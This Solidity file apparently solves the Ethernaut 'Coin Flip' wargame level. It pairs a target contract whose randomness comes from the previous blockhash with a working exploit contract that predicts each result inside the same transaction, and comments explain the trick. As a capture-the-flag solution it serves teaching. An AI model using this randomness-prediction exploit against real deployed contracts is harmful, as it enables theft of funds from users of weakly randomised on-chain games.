// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EthernautThreeCoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract EthernautThreeCoinFlipExploit {
    EthernautThreeCoinFlip private ethernautThreeCoinFlip;

    constructor(EthernautThreeCoinFlip _address) {
        ethernautThreeCoinFlip = EthernautThreeCoinFlip(_address);
    }

    function exploit() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue /
            57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        ethernautThreeCoinFlip.flip(side);
    }
}

// https://ethernaut.openzeppelin.com/level/0x90501cC20b65f603f847398740eaC4C9BE4873a9

// Solution
// The exploit lies in the fact that the block.number is not random.
// If you write a contract which has the exact same logic to generate the side
// and call the main contract flip with this generated side it will work.
// This is because the whole thing runs in one transaction and hence
// the block.number will be the same.
// The contract doesn't allow 10 flip guesses within the same block though.
// So you do need to call the exploit contract 10 times each submitted
// after the last block is done.
